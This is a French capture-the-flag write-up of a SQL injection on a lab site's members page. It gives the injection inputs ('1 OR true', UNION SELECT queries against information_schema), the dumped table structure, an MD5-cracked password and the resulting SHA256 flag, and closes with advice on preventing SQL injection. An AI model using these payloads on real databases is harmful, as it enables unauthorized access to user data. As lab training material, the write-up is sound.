# Injection SQL MEMBERzS

Aller dans l'onglet MEMBERS : http://IP/?page=member

L'injection SQL est une méthodes d'exploitation de faille de sécurité d'une application interagissant avec une base de données. Elle permet d'injecter dans la requête SQL en cours un morceau de requête non prévu par le système et pouvant en compromettre la sécurité.

En tapant la commande SQL : `1 OR true` pour afficher tous les membres

On peut voir un compte :

```
First name: Flag
Surname : GetThe
```

Nous voulons trouver toutes les tables et colonnes associer à la database, nous allons utiliser la commande SQL :

`1 UNION SELECT table_name, column_name FROM information_schema.columns`

Structure des tables de la DB:

| Table name       | Column name                                                                     |
|------------------|---------------------------------------------------------------------------------|
| USERS            | user_id, first_name, last_name, town, country, planet, Commentaire, countersign |
| GUESTBOOK        | id_comment, comment, name                                                       |
| LIST_IMAGES      | id, url, title, comment                                                         |
| VOTE_DBS         | id_vote, vote, nb_vote, subject                                                 |


Nous allons donc récupérer toutes les informations de notre compte **Flag** :

Via la commande SQL : `1 UNION SELECT first_name,last_name FROM list_images`
On fera cela pour toutes les colonnes de la tables **USERS**.

```
user_id: 5
first_name: Flag
last_name: GetThe
town: 42
country: 42
planet: 42
Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign: 5ff9d0165b4f92b14994e5c685cdce28
```

- On peut voir un code chiffré dans la colonne **countersign**.
- On va la décoder à l'aide du **site dcode**, c'est un chiffrement **MD5** (FortyTwo)
- Dans la colonne commentaire il est demandé de dechiffrer le mot de passe, de le mettre en minuscule et de le chiffrer en SHA256, ce qui donne fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5



### Comment protéger vos bases de données d’une injection SQL

- Vérifier la saisie utilisateur, les données remises devraient toujours être en accord avec le type de données attendu.
- Échapper les caractères spéciaux à l’aide de mysqli_real_escape_string() ou autres fonctions.
- Préférer l’utilisation de comptes utilisateurs à accès limité pour empêcher la modification ou suppression d’éléments de la base de données.
